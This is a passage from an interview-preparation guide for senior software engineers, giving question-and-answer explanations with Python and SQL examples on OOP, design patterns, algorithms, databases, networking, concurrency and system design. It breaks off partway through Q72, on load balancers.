# 100 General Software Engineering Interview Q&A — With Code Examples
### For Senior Roles · Examples in Python & SQL

---

## Part 1: Programming Fundamentals & OOP (Q1–Q15)

**Q1. What is dependency injection?**
Instead of a class creating the objects it needs, those dependencies are **handed to it** from outside.
*Analogy:* a chef doesn't build the oven — the kitchen provides one.

```python
# WITHOUT DI — hard-wired, impossible to test without a real DB
class OrderService:
    def __init__(self):
        self.db = PostgresDB("prod-server")   # locked in

# WITH DI — flexible, testable
class OrderService:
    def __init__(self, db):                   # dependency injected
        self.db = db

svc = OrderService(PostgresDB("prod"))        # production
svc = OrderService(FakeDB())                  # unit test — no real DB needed
```
*Why it matters:* swap implementations freely, test in isolation. It's the "D" in SOLID made practical.

**Q2. What are the four pillars of OOP?**

```python
class Animal:                        # ABSTRACTION: expose speak(), hide details
    def __init__(self, name):
        self._name = name            # ENCAPSULATION: internal state, underscore = "private"
    def speak(self):
        raise NotImplementedError

class Dog(Animal):                   # INHERITANCE: Dog is-an Animal
    def speak(self):
        return "Woof"

class Cat(Animal):
    def speak(self):
        return "Meow"

for a in [Dog("Rex"), Cat("Tom")]:   # POLYMORPHISM: same call, different behavior
    print(a.speak())                 # Woof, Meow
```
- **Encapsulation** — bundle data + behavior, hide internals
- **Abstraction** — expose *what*, hide *how*
- **Inheritance** — reuse via "is-a"
- **Polymorphism** — one interface, many behaviors

**Q3. What is the difference between an interface and an abstract class?**
Interface = pure contract, no state, implement many. Abstract class = partial implementation + shared state, extend one.

```python
from abc import ABC, abstractmethod

class Printable(ABC):                    # interface-style: pure contract
    @abstractmethod
    def print_out(self): ...

class Report(ABC):                       # abstract class: shared skeleton
    def __init__(self, title):
        self.title = title               # shared state
    def header(self):                    # shared implementation
        return f"== {self.title} =="
    @abstractmethod
    def body(self): ...                  # children must fill this in
```
Rule of thumb: interface for *capability*, abstract class for *shared skeleton*.

**Q4. What is composition over inheritance?**

```python
# INHERITANCE — rigid: what if a car is electric? GasCar(Car)? Tree explodes.
class Car(GasEngineVehicle): ...

# COMPOSITION — flexible: a Car HAS an engine; swap it freely
class Car:
    def __init__(self, engine):
        self.engine = engine             # has-a
    def start(self):
        return self.engine.ignite()

Car(GasEngine())
Car(ElectricEngine())                    # no hierarchy changes needed
```
Prefer composition; reserve inheritance for true, stable is-a relationships.

**Q5. What is coupling and cohesion?**
- **Coupling** — how much modules depend on each other's internals. Low = change one without breaking others.
- **Cohesion** — how focused one module is on one job. High = everything in it belongs together.

```python
# HIGH coupling (bad): reaches into another object's internals
if order.customer.address.country.tax_rules.rate > 0.2: ...

# LOW coupling: ask, don't dig ("Law of Demeter")
if order.tax_rate() > 0.2: ...
```
Goal of nearly every design principle: **low coupling, high cohesion**.

**Q6. What is polymorphism — compile-time vs runtime?**
- **Compile-time (overloading)**: same name, different parameter types — resolved at compile time (Java/C++; Python approximates with default args or `singledispatch`).
- **Runtime (overriding)**: subclass replaces a parent method; the actual object's version runs.

```python
class Notifier:
    def send(self, msg): print("generic:", msg)

class SmsNotifier(Notifier):
    def send(self, msg): print("SMS:", msg)     # override

def alert(n: Notifier):
    n.send("server down")        # which send()? Decided at RUNTIME by object type

alert(SmsNotifier())             # SMS: server down
```

**Q7. Pass-by-value vs pass-by-reference?**
Most languages (Python, Java, JS) pass **object references by value**: you can mutate the object's contents, but reassigning the parameter doesn't affect the caller.

```python
def modify(lst, num):
    lst.append(4)      # mutates the SHARED list → caller sees it
    num = 99           # rebinds local name only → caller unaffected

a, b = [1, 2, 3], 5
modify(a, b)
print(a, b)            # [1, 2, 3, 4]  5
```
This one distinction explains a huge class of "why did my data change?" bugs.

**Q8. What is immutability and why is it valuable?**

```python
# Mutable danger: distant code corrupts your data
config = {"retries": 3}
some_library(config)          # did it change config? Who knows.

# Immutable: safe to share, compare, cache
from dataclasses import dataclass
@dataclass(frozen=True)
class Config:
    retries: int = 3

c2 = Config(retries=5)        # "change" = new object; original untouched
```
Immutable objects are thread-safe by construction, cacheable, and comparable by value.

**Q9. What is a pure function?**
Same inputs → same output, **no side effects**.

```python
# PURE — trivially testable, cacheable, parallelizable
def total(prices, tax):
    return sum(prices) * (1 + tax)

# IMPURE — depends on hidden state, touches the outside world
def total_impure(prices):
    log_to_file(prices)                 # side effect
    return sum(prices) * (1 + GLOBAL_TAX)   # hidden input
```
Good architecture: pure logic core, side effects (DB, network, I/O) pushed to the edges.

**Q10. Static vs dynamic typing?**
Static (Java, Go, TypeScript, Python+mypy): types checked before running — errors caught early, refactoring is safe, code self-documents. Dynamic (Python, JS): faster to start, errors surface at runtime.

```python
def pay(user: User, amount: Decimal) -> Receipt: ...
# With a type checker, calling pay("bob", 5) fails BEFORE deployment, not in prod.
```
Senior take: on large, long-lived codebases, static types are machine-checked documentation that pays for itself.

**Q11. Memory: stack vs heap, and garbage collection?**
- **Stack** — function calls + locals; automatic, fast, freed on return.
- **Heap** — objects with longer lifetimes; freed manually (C) or by a **garbage collector** that reclaims anything unreachable.

```python
def f():
    x = [1] * 1_000_000   # list lives on the heap; local name x on the stack
    return None            # after return, list is unreachable → GC frees it
```
GC eliminates use-after-free and most leaks, at the cost of occasional pauses. (CPython: reference counting + a cycle collector.)

**Q12. What causes memory leaks in garbage-collected languages?**
GC frees only *unreachable* objects — leaks are things still referenced but no longer needed:

```python
CACHE = {}                          # global, grows forever
def get_user(uid):
    if uid not in CACHE:
        CACHE[uid] = load(uid)      # never evicted → leak
    return CACHE[uid]

# Fix: bounded cache
from functools import lru_cache
@lru_cache(maxsize=10_000)
def get_user(uid): return load(uid)
```
Other suspects: event listeners never unregistered, closures capturing large objects. Detection: diff heap snapshots over time.

**Q13. What does good exception handling look like?**
Catch only where you can act; add context; never swallow silently; clean up resources.

```python
def charge(order):
    try:
        gateway.pay(order.total)
    except PaymentDeclined as e:            # specific, actionable
        raise OrderError(f"payment declined for {order.id}") from e  # keep the chain
    finally:
        release_inventory_hold(order)       # cleanup runs no matter what

# ANTI-PATTERN:
try: everything()
except Exception: pass                       # silent swallow — bugs vanish into the void
```
Design distinction: expected outcomes (validation failure) are return values; exceptions are for the exceptional.

**Q14. What is recursion, and what are its risks?**

```python
def depth(node):                     # natural for trees
    if node is None: return 0        # base case — mandatory
    return 1 + max(depth(node.left), depth(node.right))
```
Risks: stack overflow on deep inputs (Python limit ≈ 1000) and repeated work — naive `fib(n)` is O(2ⁿ); memoize or build iteratively:

```python
from functools import lru_cache
@lru_cache(None)
def fib(n): return n if n < 2 else fib(n-1) + fib(n-2)   # O(n)
```
Any recursion can become a loop with an explicit stack when depth is a concern.

**Q15. Compiler vs interpreter (and JIT)?**
Compiler: whole program → machine code before running (C, Go). Interpreter: execute source directly (classic Python). **JIT**: run as bytecode, then compile *hot paths* to machine code at runtime (JVM, V8, PyPy) — flexibility plus near-compiled speed where it counts.
*Concrete:* the same Java loop runs slowly the first hundred iterations, then the JIT kicks in and it runs at C-like speed.

---

## Part 2: Design Principles & Patterns (Q16–Q27)

**Q16. What are the SOLID principles?**
- **S**ingle responsibility — one reason to change per module
- **O**pen/closed — extend via new code, don't edit tested code
- **L**iskov substitution — subtypes work anywhere the parent does
- **I**nterface segregation — small focused interfaces over fat ones
- **D**ependency inversion — depend on abstractions, not concretions

```python
# O + D together: add a new payment method WITHOUT touching Checkout
class PaymentMethod(ABC):
    @abstractmethod
    def pay(self, amount): ...

class Checkout:
    def __init__(self, method: PaymentMethod):   # depends on the abstraction
        self.method = method

class ApplePay(PaymentMethod):                   # extension = new class only
    def pay(self, amount): ...
```

**Q17. Single Responsibility Principle with an example**

```python
# VIOLATION: three reasons to change (business rules, formatting, delivery)
class ReportService:
    def generate(self): ...
    def to_pdf(self): ...
    def email(self): ...

# SRP: each piece changes and tests independently
class ReportCalculator: ...
class PdfFormatter: ...
class EmailSender: ...
```
"Responsibility" = a *source of change*, not "does exactly one function."

**Q18. Liskov Substitution Principle in practice**

```python
class Bird:
    def fly(self): ...

class Penguin(Bird):
    def fly(self): raise NotImplementedError   # LSP VIOLATION
# Any code that trusts Bird.fly() now explodes on Penguins.

# Fix: restructure the hierarchy
class Bird: ...
class FlyingBird(Bird):
    def fly(self): ...
class Penguin(Bird): ...                        # simply not a FlyingBird
```
Symptom of violation: `isinstance(x, Penguin)` checks scattered through code — the abstraction has leaked.

**Q19. DRY, KISS, YAGNI**
- **DRY** — one authoritative place per piece of *knowledge* (the tax rate lives in ONE constant). Caveat: two code blocks that look alike but represent *different concepts* should stay separate — a wrong shared abstraction is worse than duplication.
- **KISS** — the simplest design that meets the requirement wins.
- **YAGNI** — don't build for imagined futures ("we might need multi-currency someday") — when the need arrives, it arrives different.

**Q20. The Singleton pattern — and why it's controversial**

```python
# Classic singleton
class Config:
    _instance = None
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
```
Problems: it's global state in disguise — hidden dependencies (nothing in a function signature reveals it), hard to fake in tests, thread-safety concerns. Modern preference: build **one instance at startup and inject it** (Q1) — you get "only one exists" without the downsides.

**Q21. Factory and Builder patterns**

```python
# FACTORY — centralize WHICH class to create
def payment_factory(kind: str) -> PaymentMethod:
    return {"stripe": Stripe, "paypal": PayPal}[kind]()

# BUILDER — construct complex objects step by step (vs 8-arg constructors)
req = (RequestBuilder()
       .url("https://api.x.com")
       .timeout(5)
       .retries(3)
       .build())
```
Both exist to tame object creation and keep callers depending only on interfaces.

**Q22. Observer (pub/sub) pattern**

```python
class EventBus:
    def __init__(self):
        self.subs = defaultdict(list)
    def subscribe(self, event, fn):
        self.subs[event].append(fn)
    def publish(self, event, data):
        for fn in self.subs[event]:
            fn(data)

bus = EventBus()
bus.subscribe("order_placed", send_confirmation_email)
bus.subscribe("order_placed", update_inventory)     # add listeners freely
bus.publish("order_placed", order)                  # publisher knows nobody
```
Decoupling is the win; the risks are forgotten subscriptions (leaks) and hard-to-trace reaction chains.

**Q23. Strategy pattern**

```python
def flat_rate(order): return 5.0
def by_weight(order): return order.kg * 1.2
def express(order):  return 15.0

class Checkout:
    def __init__(self, shipping_strategy):
        self.shipping = shipping_strategy       # algorithm injected
    def total(self, order):
        return order.subtotal + self.shipping(order)
```
Cures sprawling `if kind == "flat"... elif kind == "weight"...` chains; adding a strategy touches zero existing code (Open/Closed in action).

**Q24. Adapter, Decorator, Facade**

```python
# ADAPTER — make an incompatible interface fit yours
class StripeAdapter(PaymentMethod):
    def __init__(self, stripe_sdk): self.sdk = stripe_sdk
    def pay(self, amount):
        self.sdk.create_charge(cents=int(amount * 100))   # translate

# DECORATOR — wrap to add behavior without changing the original
class CachedRepo:
    def __init__(self, repo): self.repo, self.cache = repo, {}
    def get(self, key):
        if key not in self.cache:
            self.cache[key] = self.repo.get(key)
        return self.cache[key]

# FACADE — one simple door hiding a messy subsystem
class CheckoutFacade:
    def process(self, cart):
        inventory.reserve(cart); payment.charge(cart)
        shipping.schedule(cart); email.confirm(cart)
```

**Q25. Repository pattern**

```python
class UserRepository(ABC):
    @abstractmethod
    def find_by_email(self, email): ...

class PostgresUserRepo(UserRepository):
    def find_by_email(self, email):
        return self.db.query("SELECT * FROM users WHERE email = %s", email)

class InMemoryUserRepo(UserRepository):        # for tests — no DB at all
    def __init__(self): self.users = {}
    def find_by_email(self, email): return self.users.get(email)
```
Business logic talks to the interface and never knows what storage answers — swap databases, test without one.

**Q26. Inversion of control (IoC)?**
The general principle behind DI: the framework controls construction and flow and calls *your* code at the right moments — "don't call us, we'll call you."
*Concrete:* a web framework routes the request, parses the body, then invokes your handler; a DI container builds your object graph; an event loop invokes your callbacks. You write the filling; the framework is the sandwich.

**Q27. What is an anti-pattern? Examples.**
A common "solution" that reliably backfires:
- **God object** — one class importing half the codebase, knowing everything
- **Spaghetti code** — tangled flow, no structure
- **Golden hammer** — one beloved tool applied to every problem
- **Premature optimization** — complexity before measurement ("I cached everything" — was anything slow?)
- **Big ball of mud** — a system with no discernible architecture
Recognizing these in a codebase (and in your own designs) is as valuable as knowing patterns.

---

## Part 3: Data Structures & Algorithms (Q28–Q39)

**Q28. What is Big-O notation, in plain terms?**
How cost grows with input size, ignoring constants:

| Big-O | Name | Example | n = 1,000,000 |
|---|---|---|---|
| O(1) | constant | dict lookup | 1 step |
| O(log n) | logarithmic | binary search | ~20 steps |
| O(n) | linear | one scan | 10⁶ steps |
| O(n log n) | linearithmic | good sorts | ~2×10⁷ |
| O(n²) | quadratic | nested loops | 10¹² — too slow |

It answers: "will this still work at 10 million items?"

**Q29. Array vs linked list?**
Array: contiguous memory → O(1) index access, cache-friendly; O(n) middle insert (shifting). Linked list: O(1) insert *at a known node*; O(n) to find anything, cache-hostile.

```python
arr[500]            # O(1) — jump straight there
node = head
for _ in range(500): node = node.next     # O(n) — walk every link
```
In practice dynamic arrays win almost always; know *why* you'd deviate (e.g., an LRU cache needs a linked list for O(1) removal from the middle — paired with a hash map).

**Q30. How does a hash table work, and what about collisions?**

```python
index = hash(key) % capacity      # key → bucket
```
Average O(1) get/put. Collisions (two keys, same bucket) handled by **chaining** (list per bucket) or **open addressing** (probe next slots). At high load factor the table resizes and rehashes everything. Worst case O(n) — why hash quality matters, and why keys must be immutable (a mutated key would be "filed" in the wrong bucket).

**Q31. Stack vs queue — where does each show up?**
- **Stack (LIFO)** — call stack, undo history, matched-brackets validation, DFS
- **Queue (FIFO)** — job/message queues, BFS, request buffering

```python
# Balanced brackets — the canonical stack question
pairs = {')': '(', ']': '[', '}': '{'}
stack = []
for c in s:
    if c in "([{": stack.append(c)
    elif not stack or stack.pop() != pairs[c]: return False
return not stack
```

**Q32. Binary search tree — and why balance matters?**
Left < node < right → O(log n) operations *if balanced*. Insert sorted data into a naive BST and it degenerates into a linked list → O(n):

```
Insert 1,2,3,4,5:      1
                         \
                          2       ← every node right: a list wearing a tree costume
                           \
                            3 ...
```
Self-balancing trees (red-black, AVL) rotate to stay ~log n; databases use the disk-friendly cousin, the **B-tree**, for indexes (Q42).

**Q33. What is a heap and what is it for?**
An array-encoded tree where every parent ≤ its children (min-heap): peek min O(1), push/pop O(log n).

```python
import heapq
h = [5, 1, 9]; heapq.heapify(h)     # O(n)
heapq.heappush(h, 0)
heapq.heappop(h)                     # 0 — always the smallest
```
Uses: priority queues, schedulers, Dijkstra, "top K of a stream" without sorting everything.

**Q34. Graphs — BFS vs DFS?**

```python
def bfs(graph, start):               # level by level → SHORTEST PATH (unweighted)
    q, seen = deque([start]), {start}
    while q:
        node = q.popleft()
        for nxt in graph[node]:
            if nxt not in seen:
                seen.add(nxt); q.append(nxt)

def dfs(graph, node, seen=None):     # dive deep → cycles, components, topo sort
    seen = seen or set(); seen.add(node)
    for nxt in graph[node]:
        if nxt not in seen: dfs(graph, nxt, seen)
```
Real-world: BFS = "fewest hops between two people"; DFS + topological sort = how build tools order dependent tasks.

**Q35. Binary search and its key requirement**

```python
lo, hi = 0, len(a) - 1
while lo <= hi:
    mid = (lo + hi) // 2
    if a[mid] == target: return mid
    if a[mid] < target: lo = mid + 1
    else: hi = mid - 1
return -1
```
Requires **sorted** (or monotonic) data — a million items in ~20 steps. The pattern generalizes: "binary search the answer" (guess a capacity, check feasibility, halve the range).

**Q36. Compare the common sorting algorithms**

| Algorithm | Average | Worst | Space | Stable | Note |
|---|---|---|---|---|---|
| Quicksort | n log n | n² | log n | no | usual in-memory default |
| Merge sort | n log n | n log n | n | **yes** | linked lists, external sort |
| Heap sort | n log n | n log n | 1 | no | guaranteed, in-place |
| Insertion | n² | n² | 1 | yes | fastest for tiny/nearly-sorted |

**Stable** = equal items keep their relative order — it's why you can sort by name, then by department, and names stay ordered within each department. Production sorts (Timsort, introsort) are hybrids of these.

**Q37. Memoization / dynamic programming?**
When subproblems repeat, solve each once and cache.

```python
# Naive: O(2^n) — recomputes the same values astronomically often
def fib(n): return n if n < 2 else fib(n-1) + fib(n-2)

# DP (bottom-up): O(n) time, O(1) space
def fib(n):
    a, b = 0, 1
    for _ in range(n): a, b = b, a + b
    return a
```
The DP recipe: define the state, write the recurrence, cache or tabulate. Real-world flavor: any expensive deterministic function is a caching candidate.

**Q38. What is a Bloom filter?**
A tiny bit-array + k hash functions answering "have I seen this?" — **no false negatives**, small chance of false positives.
*Use:* cheap pre-check before an expensive lookup. "Is this key definitely NOT in the database?" → skip the disk read entirely. Browsers famously used one for "is this URL malicious?" Trade-off: can't delete entries (without counting variants), and you tune size vs false-positive rate.

**Q39. How do you approach an unfamiliar algorithm problem?**
A repeatable script:
1. Restate + clarify constraints (input size? duplicates? sorted? negative numbers?)
2. Work a small example by hand
3. State the brute force **and its complexity** out loud
4. Hunt for structure: sorted → two pointers/binary search; counting → hash map; "next greater" → stack; overlapping subproblems → DP
5. Code cleanly, narrate choices
6. Test edge cases: empty, one element, all-same, extremes
Interviewers grade the *process* — a narrated partial solution beats silent perfection.

---

## Part 4: Databases (Q40–Q51)

**Q40. SQL vs NoSQL — how do you choose?**
Relational (Postgres/MySQL): relationships, joins, ACID, ad-hoc queries — the correct **default** for business data. NoSQL when a shape genuinely fits: documents (Mongo) for flexible nesting, key-value (Redis) for speed, wide-column (Cassandra) for massive writes, graph (Neo4j) for relationship-heavy queries.

```sql
-- Relational shines: answer questions you didn't plan for
SELECT c.name, SUM(o.total)
FROM customers c JOIN orders o ON o.customer_id = c.id
WHERE o.created_at > NOW() - INTERVAL '30 days'
GROUP BY c.name ORDER BY 2 DESC LIMIT 10;
```
Decide by data shape, consistency needs, and query patterns — not fashion.

**Q41. What are ACID properties?**

```sql
BEGIN;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;  -- debit
UPDATE accounts SET balance = balance + 100 WHERE id = 2;  -- credit
COMMIT;   -- ATOMIC: both happen or neither; crash mid-way → rollback
```
- **Atomicity** — all or nothing
- **Consistency** — constraints always hold (balance CHECK >= 0 can't be violated)
- **Isolation** — concurrent transactions don't see each other's half-done work
- **Durability** — once committed, survives a crash
This is why money and inventory live in transactional databases.

**Q42. How does a database index work, and what does it cost?**
A **B-tree**: sorted, shallow (3–4 levels for millions of rows) → a few page reads instead of a full scan.

```sql
CREATE INDEX idx_users_email ON users(email);

EXPLAIN SELECT * FROM users WHERE email = 'a@b.com';
-- Before: Seq Scan (cost ~25000)   After: Index Scan (cost ~8)
```
Costs: storage + every INSERT/UPDATE maintains each index. Composite rule: an index on `(a, b)` serves queries on `a` or `a AND b` — **not** `b` alone (like a phone book sorted by last name, then first: useless for finding all "Davids").

**Q43. Normalization — and when do you denormalize?**

```sql
-- NORMALIZED: author name lives in ONE place
posts(id, title, author_id)
authors(id, name)

-- DENORMALIZED: duplicate for read speed, accept sync burden
posts(id, title, author_id, author_name)   -- no join to render a feed
```
Normalize transactional data (no update anomalies). Denormalize deliberately for read-heavy paths, caches, and analytics — and own the job of keeping copies in sync.

**Q44. What is the N+1 query problem?**

```python
orders = db.query("SELECT * FROM orders LIMIT 100")     # 1 query
for o in orders:
    o.customer = db.query(                              # +100 queries!
        "SELECT * FROM customers WHERE id = %s", o.customer_id)

# FIX: one join or one batched IN — 101 round trips → 2
customers = db.query(
    "SELECT * FROM customers WHERE id = ANY(%s)",
    [o.customer_id for o in orders])
```
The classic ORM trap: invisible in dev with 5 rows, brutal in prod with 5000. Fix with joins, `IN` batching, or the ORM's eager loading.

**Q45. What are transaction isolation levels?**
The dial between correctness and concurrency:
- **Read uncommitted** — may see others' uncommitted data (dirty reads)
- **Read committed** — only committed data (Postgres default)
- **Repeatable read** — re-reading the same rows gives the same answer within the transaction
- **Serializable** — as if transactions ran one at a time; safest, slowest

*Concrete anomaly below serializable:* two concurrent requests both read `seats_left = 1`, both decide it's fine, both book — oversold. Fix: serializable, or explicit locking (Q46).

**Q46. Optimistic vs pessimistic locking?**

```sql
-- PESSIMISTIC: lock the row up front; others wait
BEGIN;
SELECT * FROM seats WHERE id = 7 FOR UPDATE;
UPDATE seats SET taken = true WHERE id = 7;
COMMIT;
```
```python
# OPTIMISTIC: no lock — version check at write time; retry on conflict
rows = db.execute("""
    UPDATE docs SET body = %s, version = version + 1
    WHERE id = %s AND version = %s""", body, doc_id, seen_version)
if rows == 0: raise ConflictRetry()
```
Optimistic wins when conflicts are rare (most web apps); pessimistic when contention is high (ticket sales).

**Q47. What is replication, and what does replication lag cause?**
Primary takes writes; replicas serve reads (read scaling + failover). Replication is usually async → **lag**:

```
t0: UPDATE profile → primary        ✓
t1: user reloads page → read hits a replica (200ms behind)
t2: user sees their OLD profile → "the save didn't work!" → saves again
```
Mitigations: read your own writes from the primary, sticky routing after a write, or synchronous replication at a latency cost.

**Q48. What is sharding?**
Splitting data across machines by a **shard key**:

```python
shard = hash(user_id) % NUM_SHARDS      # user's data lives on one shard
```
Costs: cross-shard queries/transactions get hard, hot keys make hot shards, resharding is painful. Senior take: exhaust indexing, caching, replicas, and bigger hardware first — shard when you must, not when it sounds impressive.

**Q49. CAP theorem in plain terms?**
When the network partitions (nodes can't reach each other), a distributed store must pick:
- **CP** — refuse to answer rather than risk staleness (bank ledger: "try again later" beats a wrong balance)
- **AP** — answer, possibly stale, converge later — **eventual consistency** (a like count being 2 seconds behind harms nobody)
The always-ask design question: "what does the user experience if this read is stale?"

**Q50. How do you run schema migrations with zero downtime?**
Versioned migration files in git, applied on deploy — every change **backwards-compatible, in phases**:

```
1. ADD COLUMN new_email TEXT NULL          -- old code ignores it, fine
2. deploy code writing BOTH old and new
3. backfill: UPDATE ... SET new_email = old_email WHERE new_email IS NULL
4. deploy code reading new_email
5. DROP COLUMN old_email                   -- only when nothing reads it
```
Never rename/drop in one step while old code is live — that's how deploys take sites down.

**Q51. Why is offset pagination problematic? What's the alternative?**

```sql
-- OFFSET: scans and discards 100k rows; page 5000 is slow; rows shift mid-scroll
SELECT * FROM posts ORDER BY id LIMIT 20 OFFSET 100000;

-- KEYSET (cursor): constant time at any depth, stable under inserts
SELECT * FROM posts WHERE id > :last_seen_id ORDER BY id LIMIT 20;
```
Use offset only for small, shallow lists; infinite scroll and APIs should use cursors.

---

## Part 5: Networking, Web & APIs (Q52–Q61)

**Q52. What happens when you type a URL and hit enter?**
1. **DNS** — browser cache → OS cache → resolver → root/TLD/authoritative → IP
2. **TCP handshake** — SYN, SYN-ACK, ACK
3. **TLS handshake** — certificate verified, keys agreed (Q59)
4. **HTTP request** → server (often via CDN/load balancer) → response
5. **Render** — parse HTML, fetch CSS/JS/images, build render tree, paint
Senior flourish: name the caches at every layer — DNS TTL, CDN, browser cache (`Cache-Control`, `ETag`/304).

**Q53. TCP vs UDP?**

| | TCP | UDP |
|---|---|---|
| Connection | handshake first | fire-and-forget |
| Ordering/reliability | guaranteed, retransmits | none |
| Speed/overhead | heavier | minimal |
| Use | web, APIs, files | live video, gaming, DNS |

The insight: for live media, a **late** packet is worse than a **lost** one — waiting for retransmission means stutter, so UDP + "skip what's missing" wins. HTTP/3 (QUIC) rebuilds reliability atop UDP, smarter.

**Q54. HTTP essentials — methods and status codes?**
Methods: GET (read, safe), POST (create/act), PUT (replace), PATCH (partial update), DELETE. Key codes and what they *signal*:

```
200 OK          201 Created (+ Location header)    204 No Content
301 Moved       304 Not Modified (cache hit)
400 Bad Request 401 Unauthenticated  403 Forbidden  404 Not Found
409 Conflict    429 Too Many Requests (+ Retry-After)
500 Server Error                     503 Unavailable
```
Using 401 vs 403 correctly, 201 with a Location header, 429 for rate limits — small signals that you've built real APIs.

**Q55. What makes an API RESTful — and a *good* API?**

```
GET    /users/42/orders          # nouns for resources, verbs via methods
POST   /users/42/orders          # create → 201 + Location
DELETE /orders/7                 # idempotent
GET    /orders?status=paid&cursor=abc&limit=50   # filter + paginate
```
Good beyond REST: consistent error shape (`{"error": {"code": ..., "message": ...}}`), versioning plan, idempotency keys on payments, and backwards compatibility discipline — **add** fields, never repurpose them. The API is a contract; breaking it breaks other people's code.

**Q56. What is idempotency and why does it matter?**
Same result no matter how many times the operation repeats. `PUT /users/42` and `DELETE /users/42` — yes. `POST /orders` — no. It matters because **networks fail and clients retry**:

```python
# Client sends a key; server stores result per key
POST /payments   Idempotency-Key: 7f3a-...

def create_payment(req):
    if done := store.get(req.headers["Idempotency-Key"]):
        return done                      # retry → same response, no double charge
    result = charge(req)
    store.set(req.headers["Idempotency-Key"], result)
    return result
```

**Q57. REST vs GraphQL vs gRPC?**
- **REST** — simple, HTTP-cacheable, universal → default for public/CRUD APIs
- **GraphQL** — client asks for exact fields in one request → many varied clients (mobile vs web); costs: caching complexity, resolver N+1s
- **gRPC** — binary protobuf contracts, fast, streaming → internal service-to-service; weak in browsers

```graphql
query { user(id: 42) { name orders(last: 3) { total } } }  # one round trip, no over-fetch
```
Choose per audience, not fashion.

**Q58. What is DNS and how does its caching work?**
The internet's phone book: name → IP, resolved through resolver → root → TLD → authoritative, cached at every layer for the record's **TTL**.
*Practical consequences:* changes propagate gradually (lower TTL to 60s *before* a migration, raise after); DNS is itself a routing tool (round-robin, geo-DNS, failover).

**Q59. How does HTTPS/TLS work at a high level?**
1. Server presents a **certificate** — its public key, signed by a CA the client trusts
2. Client verifies the chain, then both derive session keys (asymmetric crypto for the handshake)
3. All further traffic uses fast **symmetric** encryption
Guarantees: confidentiality (no eavesdropping), integrity (no tampering), authenticity (it's really that site). *Why the hybrid:* asymmetric is slow — used only to bootstrap; symmetric does the heavy lifting.

**Q60. What is a CDN and what problems does it solve?**
Edge servers around the world holding copies of your content.
- **Latency** — physics: content 30ms away instead of 300ms
- **Origin load** — most requests never reach your servers
- **Spikes/DDoS** — absorbed at the edge
Key mechanics: cache keys, TTLs, and invalidation on deploy (usually via hashed filenames: `app.3f9d2.js` — new build, new name, cache problem gone).

**Q61. WebSockets vs polling vs SSE?**
- **Polling** — ask every N seconds; simple, wasteful, laggy
- **Long polling** — server holds the request until there's news
- **SSE** — one HTTP stream, server → client; feeds/notifications
- **WebSockets** — full duplex, persistent; chat, games, live collaboration
Trade-off: persistent connections make servers stateful — scaling needs sticky routing or a pub/sub backplane (Redis) so any node can push to any client.

---

## Part 6: Operating Systems & Concurrency (Q62–Q69)

**Q62. Process vs thread?**
Process: own isolated memory — safe, heavier, IPC to communicate. Thread: shares its process's memory — cheap, instant sharing, and therefore dangerous (races).

```python
from multiprocessing import Process   # separate memory, true parallelism in Python
from threading import Thread          # shared memory, GIL-bound for CPU work
```
Python-specific senior note: the GIL means threads help I/O-bound work, processes for CPU-bound.

**Q63. What is a race condition?**

```python
balance = 100
def deposit():                # two threads run this concurrently
    global balance
    tmp = balance             # both read 100
    tmp += 50
    balance = tmp             # both write 150 — one deposit LOST

# Fix: make the read-modify-write atomic
from threading import Lock
lock = Lock()
def deposit():
    global balance
    with lock:
        balance += 50
```
Fixes in preference order: design shared state away (immutability, message passing, single writer) → atomics → locks.

**Q64. What is deadlock and how do you prevent it?**

```python
# Thread A: with lock1: with lock2: ...
# Thread B: with lock2: with lock1: ...   ← opposite order → both wait forever
```
Four conditions must all hold (mutual exclusion, hold-and-wait, no preemption, circular wait); break any one. Most practical fix: **acquire locks in one global order everywhere** — plus timeouts as a safety net.

**Q65. Mutex vs semaphore?**

```python
from threading import Lock, Semaphore
lock = Lock()                # ONE holder; holder must release  → one bathroom key
db_slots = Semaphore(10)     # N permits → at most 10 concurrent DB calls
with db_slots:
    query()
```

**Q66. Concurrency vs parallelism?**
- **Concurrency** — *dealing with* many things at once (structure): one barista juggling orders; async I/O on one core
- **Parallelism** — *doing* many things at the same instant (execution): eight cores crunching data

```python
import asyncio                       # concurrency without threads
async def main():
    a, b = await asyncio.gather(fetch(url1), fetch(url2))  # overlap the waiting
```

**Q67. Blocking vs non-blocking (async) I/O?**
Blocking: the thread stops until the disk/network answers — simple, but each waiting request holds a thread. Non-blocking: start the operation, do other work, resume on completion — one thread juggles thousands of connections.

```python
resp = requests.get(url)             # blocking: thread parked ~200ms
resp = await session.get(url)        # async: event loop serves others meanwhile
```
Corollary: CPU-heavy work on the event loop freezes *everyone* — offload it to workers.

**Q68. What is virtual memory?**
The OS gives each process the illusion of its own large contiguous memory, mapping pages to physical RAM on demand and swapping cold pages to disk. Wins: process isolation (one crash can't scribble on another), memory-mapped files, overcommit. Failure mode: RAM exhausted → heavy swapping → **thrashing** — the machine seems alive but does nothing; performance falls off a cliff.

**Q69. What is a thread pool and why use one?**

```python
from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=20) as pool:
    results = list(pool.map(fetch_url, urls))   # bounded concurrency + reuse
```
Unbounded thread spawning exhausts memory and drowns in context switches. A pool caps concurrency, reuses workers, and its bounded queue is a natural backpressure point. Sizing: CPU-bound ≈ cores; I/O-bound → more (threads mostly wait).

---

## Part 7: System Design & Architecture (Q70–Q82)

**Q70. How do you approach a system design question?**
A repeatable script (e.g., "design a URL shortener"):
1. **Requirements + scale** — reads vs writes? "100M new URLs/month, 10B redirects" → read-heavy 100:1
2. **API** — `POST /shorten {url}` → `{short}`; `GET /{short}` → 301
3. **High level** — client → LB → stateless app servers → cache → DB
4. **Data model + keys** — base62 of an auto-increment ID vs hash; collision story
5. **Deep dive** — cache hot redirects (they're immutable → cache forever), 301 vs 302 trade-off
6. **Bottlenecks/failures** — hot keys, DB failover, monitoring
Narrated trade-offs ("I'd pick X over Y because...") are what's graded.

**Q71. Horizontal vs vertical scaling?**
Vertical: bigger machine — easy, has a ceiling, single point of failure. Horizontal: more machines behind a load balancer — near-unlimited and fault-tolerant, but requires **stateless** servers:

```python
# STATEFUL (breaks horizontal scaling): session in server memory
SESSIONS = {}                       # user's next request may hit another server!

# STATELESS: shared state lives outside the server
session = redis.get(f"session:{sid}")   # any instance can serve any request
```

**Q72. What does a load balancer do?**
Distributes traffic (round-robin, least-connections), health-checks instances and routes around failures, often terminates TLS.
- **L4** — balances on IP/port; fast, protocol-blind
